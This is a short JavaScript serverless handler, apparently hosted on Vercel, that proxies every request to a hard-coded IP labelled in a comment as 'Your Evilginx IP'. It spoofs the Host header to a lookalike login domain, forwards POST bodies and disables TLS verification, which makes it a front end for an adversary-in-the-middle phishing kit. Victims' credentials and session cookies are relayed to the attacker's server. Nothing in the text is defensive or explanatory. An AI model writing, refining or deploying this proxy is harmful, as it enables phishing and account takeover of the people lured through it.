import https from 'https';

export default async function handler(req, res) {
  const targetHost = '185.165.171.174'; // Your Evilginx IP
  const targetPath = req.url;

  // Critical headers that Evilginx requires
  const headers = {
    'Host': 'login.espeharete.top',
    'User-Agent': req.headers['user-agent'] || 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Accept': req.headers['accept'] || 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': req.headers['accept-language'] || 'en-US,en;q=0.9',
    'Accept-Encoding': 'gzip, deflate, br',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1',
    'X-Forwarded-For': req.headers['x-forwarded-for'] || req.ip || '127.0.0.1',
    'X-Real-IP': req.headers['x-real-ip'] || req.ip || '127.0.0.1',
    'Referer': `https://aa-iido.vercel.app${req.url}`
  };

  const options = {
    hostname: targetHost,
    port: 443,
    path: targetPath,
    method: req.method,
    headers: headers,
    rejectUnauthorized: false, // Bypass SSL verification
    timeout: 10000
  };

  return new Promise((resolve) => {
    const proxyReq = https.request(options, (proxyRes) => {
      // Forward all headers except those that cause issues
      const responseHeaders = { ...proxyRes.headers };
      delete responseHeaders['content-length'];
      delete responseHeaders['transfer-encoding'];
      
      res.writeHead(proxyRes.statusCode, responseHeaders);
      
      // Pipe the response directly without modification
      proxyRes.pipe(res);
      
      proxyRes.on('end', () => resolve());
    });

    proxyReq.on('error', (err) => {
      console.error('Proxy error:', err);
      if (!res.headersSent) {
        res.status(502).send('Proxy Error: ' + err.message);
      }
      resolve();
    });

    proxyReq.on('timeout', () => {
      proxyReq.destroy();
      if (!res.headersSent) {
        res.status(504).send('Gateway Timeout');
      }
      resolve();
    });

    // Forward request body if present
    if (req.method === 'POST' || req.method === 'PUT') {
      req.pipe(proxyReq);
    } else {
      proxyReq.end();
    }
  });
}
